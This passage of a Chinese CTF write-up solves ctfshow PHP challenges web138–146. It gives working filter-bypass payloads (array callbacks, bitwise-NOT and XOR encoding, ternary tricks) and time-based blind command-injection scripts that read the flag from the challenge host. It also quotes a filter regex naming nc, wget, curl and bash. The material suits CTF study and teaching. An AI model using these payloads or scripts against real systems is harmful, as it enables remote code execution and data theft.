class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这下过滤了<code>:</code>了</p><p>但是在<code>call_user_func</code>函数文档的<strong>示例#4</strong>中, 可以发现该函数是支持数组传入且不需要冒号, 那么可以利用数组传递payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: </span><br><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139"><a class="header-anchor" href="#web139">¶</a>web139</h2><ul><li>描述: BY YU22X, 没变化吗？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tee写文件的方式不行了, 应该是权限不足的问题</p><p>至于脚本, 我更是不懂, 用的是类似于sql盲注的方法, 我直接给出来了:</p><p>跑目录下的文件(其实只需要改一下payload就是获取flag的)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加</span></span><br><span class="line"><span class="built_in">str</span> = string.ascii_letters + string.digits + <span class="string">&quot;-&quot;</span> + <span class="string">&quot;&#123;&quot;</span> + <span class="string">&quot;&#125;&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="string">&quot;~&quot;</span>    </span><br><span class="line"><span class="comment"># 初始化一个空字符串，用于保存结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span>          </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取多少行</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">    key = <span class="number">0</span>   <span class="comment">#用于控制内层循环(j)的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#不break的情况下，一行最多几个字符</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">        <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#n就是一个一个一个的返回值</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:       </span><br><span class="line">            <span class="comment">#&#123;n&#125;是占位符</span></span><br><span class="line">            payload = <span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i, j, n)   </span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            url = <span class="string">&quot;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=&quot;</span> + payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment">#设置超时时间为 2.5 秒, 包括连接超时和读取超时, 超时就是之前sleep 3</span></span><br><span class="line">                requests.get(url, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))   </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果请求发生异常, 表示条件满足, 将当前字符 n 添加到结果字符串中, 并结束当前内层循环</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + n</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> n == <span class="string">&#x27;~&#x27;</span>:    <span class="comment">#str的最后一位，“~”不常出现，用作结尾</span></span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p>获取flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目过滤花括号，这里就不加了</span></span><br><span class="line"><span class="built_in">str</span> = string.digits + string.ascii_lowercase + <span class="string">&quot;-&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="string">&quot;~&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 |cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j, n)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        url = <span class="string">&quot;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=&quot;</span> + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="string">&quot;~&quot;</span>:</span><br><span class="line">            result = result + <span class="string">&quot;花括号&quot;</span></span><br></pre></td></tr></table></figure><h2 id="web140"><a class="header-anchor" href="#web140">¶</a>web140</h2><ul><li>描述: 没难度</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假的没难度, 这里用的是松散比较的漏洞绕过(弱比较), 0和字符串弱比较的时候就为真,所以使得<code>$code</code>为0即可让程序输出flag</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">f1=intval&amp;f2=intval</span><br><span class="line">f1=usleep&amp;f2=usleep</span><br></pre></td></tr></table></figure><p>附上一张松散比较的图, 从大佬那里拿过来的:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/c6006c6461a077cf957947b91553644a.png" alt=""></p><h2 id="web141"><a class="header-anchor" href="#web141">¶</a>web141</h2><ul><li>描述: 难度无</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if(preg_match('/^\W+$/', $v3))</code>是一段 PHP 代码, 它使用了正则表达式函数<code>preg_match</code>来检查变量<code>$v3</code>的值是否完全由非单词字符组成</p><p>而在php中, 数字是可以和命令进行一些运算的, 减一加一都是可以正常执行的</p><p>下面给出取反程序, 其他<a href="https://blog.csdn.net/miuzzx/article/details/109143413">大佬博客</a>一并给出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试执行命令, 是可以执行的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C)-&amp;v2=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240727212800008.png" alt="image-20240727212800008"></p><p>读取flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-</span><br><span class="line"># tac f*</span><br></pre></td></tr></table></figure><h2 id="web142"><a class="header-anchor" href="#web142">¶</a>web142</h2><ul><li>描述:  难度0</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制转换为字符串然后判断是否为数字, 如果传入的值不为0则会睡眠很久</p><p>直接传入0就行了, 或者是0x0, 原因是被当成八进制和十六进制的0; payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=0</span><br><span class="line">?v1=0x0</span><br></pre></td></tr></table></figure><h2 id="web143"><a class="header-anchor" href="#web143">¶</a>web143</h2><ul><li>描述: 141的plus版本</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>~</code>没了, 但是还有<code>^</code>可以用, 然后用乘除代替加减</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rce</span>():</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = <span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = <span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*</span><br></pre></td></tr></table></figure><h2 id="web144"><a class="header-anchor" href="#web144">¶</a>web144</h2><ul><li>描述: 143的plus版本</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换成v2罢了, 直接用web141的套; payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=1&amp;v2=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)</span><br></pre></td></tr></table></figure><h2 id="web145"><a class="header-anchor" href="#web145">¶</a>web145</h2><ul><li>描述: 144的plus版本</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运算符号也过滤了, 没事可以用三目运算符: 以下命令是可以执行的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>所以继续用之前的web141取反payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):</span><br></pre></td></tr></table></figure><h2 id="web146"><a class="header-anchor" href="#web146">¶</a>web146</h2><ul><li>描述: 145的plus版本</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = 